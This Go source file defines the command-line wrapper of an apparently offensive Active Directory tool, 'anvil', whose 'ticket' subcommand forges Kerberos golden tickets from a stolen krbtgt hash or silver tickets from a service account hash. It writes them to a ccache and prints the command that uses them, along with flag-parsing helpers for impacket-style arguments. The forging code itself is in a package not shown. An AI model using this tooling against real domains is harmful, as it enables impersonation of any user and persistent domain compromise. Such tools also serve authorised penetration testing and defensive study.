package cli

import (
	"fmt"
	"os"
	"strings"

	"github.com/spf13/cobra"

	"anvil/internal/ticket"
	"anvil/internal/ui"
)

func newTicketCmd() *cobra.Command {
	var (
		krbtgt    string
		nthash    string
		spn       string
		domain    string
		domainSID string
		user      string
		out       string
	)

	cmd := &cobra.Command{
		Use:   "ticket",
		Short: "Forge a golden or silver ticket from a stolen NT hash",
		Long: "Forge a Kerberos ticket offline — no KDC is contacted. Golden " +
			"(-krbtgt): a TGT for any user, signed and encrypted with the " +
			"domain's krbtgt key (from `anvil dcsync`). Silver (-nthash " +
			"+ -spn): a service ticket for one SPN, signed with the machine " +
			"or service account's key. Both are written as a ccache for " +
			"`anvil connect -k`.",
		Args: cobra.NoArgs,
		RunE: func(cmd *cobra.Command, args []string) error {
			path, err := ticket.Forge(ticket.Options{
				User:       user,
				Domain:     domain,
				DomainSID:  domainSID,
				KrbtgtHash: krbtgt,
				NTHash:     nthash,
				SPN:        spn,
				Out:        out,
			})
			if err != nil {
				ui.PrintErr(err.Error())
				os.Exit(1)
			}

			realm := strings.ToUpper(domain)
			if nthash != "" {
				fmt.Printf("%s  %s@%s -> %s\n", ui.Muted.Sprint("SILVER TICKET"), user, realm, spn)
				fmt.Printf("  %s%s\n", ui.Muted.Sprintf("%-15s", "ccache"), path)
				ui.Faint.Printf("use: KRB5CCNAME=%s anvil connect -k -u %s -d %s --host %s\n",
					path, user, realm, spnHost(spn))
				return nil
			}
			fmt.Printf("%s  %s@%s\n", ui.Muted.Sprint("GOLDEN TICKET"), user, realm)
			fmt.Printf("  %s%s\n", ui.Muted.Sprintf("%-15s", "ccache"), path)
			ui.Faint.Printf("use: KRB5CCNAME=%s anvil connect -k -u %s -d %s --host <fqdn>\n",
				path, user, realm)
			return nil
		},
	}

	cmd.Flags().StringVar(&krbtgt, "krbtgt", "", "krbtgt NT hash, 32 hex chars (LM:NT accepted) — from dcsync; forges a golden ticket")
	cmd.Flags().StringVar(&nthash, "nthash", "", "machine/service account NT hash, 32 hex chars (LM:NT accepted); forges a silver ticket")
	cmd.Flags().StringVar(&spn, "spn", "", "target SPN for a silver ticket, <service>/<fqdn> (required with -nthash)")
	cmd.Flags().StringVar(&domain, "domain", "", "DNS domain / realm, e.g. lab.local (required)")
	cmd.Flags().StringVar(&domainSID, "domain-sid", "", "domain SID, S-1-5-21-... (required)")
	cmd.Flags().StringVar(&user, "user", "", "username the ticket impersonates (required)")
	cmd.Flags().StringVar(&out, "out", "", "ccache output path (default <user>.ccache)")
	return cmd
}

// spnHost returns the host component of a <service>/<fqdn> SPN. Forge has
// already validated the form, so a missing slash just yields s unchanged.
func spnHost(s string) string {
	_, host, ok := strings.Cut(s, "/")
	if !ok {
		return s
	}
	return host
}

// ticketLongFlags are the flags whose documented single-dash form
// (-krbtgt, -domain-sid, ...) must parse.
var ticketLongFlags = map[string]bool{
	"krbtgt": true, "nthash": true, "spn": true,
	"domain": true, "domain-sid": true, "user": true, "out": true, "help": true,
}

// getstLongFlags are getst's documented single-dash long flags
// (-spn, -impersonate, -dc-ip, ...).
var getstLongFlags = map[string]bool{
	"spn": true, "impersonate": true, "user": true, "password": true,
	"hashes": true, "domain": true, "dc-ip": true, "out": true, "help": true,
}

// rewriteTicketArgs maps ticket's and getst's documented impacket-style
// single-dash long flags onto cobra's double-dash form, in place. pflag
// reads -krbtgt as shorthand -k with an attached value, so the exact CLI
// `anvil ticket -krbtgt ...` only parses by rewriting before rootCmd runs.
// Rewriting is semantically neutral for other commands: any name in either
// set is a long flag there too or absent.
func rewriteTicketArgs(args []string) {
	// Skip root persistent flags to find the subcommand token.
	i := 0
	for i < len(args) {
		if args[i] == "--timeout" {
			i += 2
			continue
		}
		if strings.HasPrefix(args[i], "-") {
			i++
			continue
		}
		break
	}
	if i >= len(args) {
		return
	}
	var longFlags map[string]bool
	switch args[i] {
	case "ticket":
		longFlags = ticketLongFlags
	case "getst":
		longFlags = getstLongFlags
	default:
		return
	}
	for j := i + 1; j < len(args); j++ {
		s := args[j]
		if s == "--" {
			return
		}
		if !strings.HasPrefix(s, "-") || strings.HasPrefix(s, "--") || len(s) <= 2 {
			continue
		}
		name := s[1:]
		if eq := strings.IndexByte(name, '='); eq >= 0 {
			name = name[:eq]
		}
		if longFlags[name] {
			args[j] = "-" + s
		}
	}
}
